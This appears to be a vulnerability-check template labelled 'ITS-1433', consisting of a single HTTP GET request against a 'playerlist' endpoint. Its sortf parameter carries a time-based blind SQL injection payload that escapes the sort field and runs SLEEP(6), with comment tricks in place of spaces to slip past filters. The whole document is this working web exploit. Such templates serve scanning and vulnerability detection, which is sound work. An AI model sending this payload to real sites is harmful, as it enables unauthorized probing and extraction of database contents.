# Vulnerable: ITS-1433
GET {{season_path}}?action=playerlist&sortf=post_title%60,(SELECT/**/x/**/FROM/**/(SELECT/**/SLEEP(6)/**/AS/**/x)/**/AS/**/t)%23&sortd=ASC
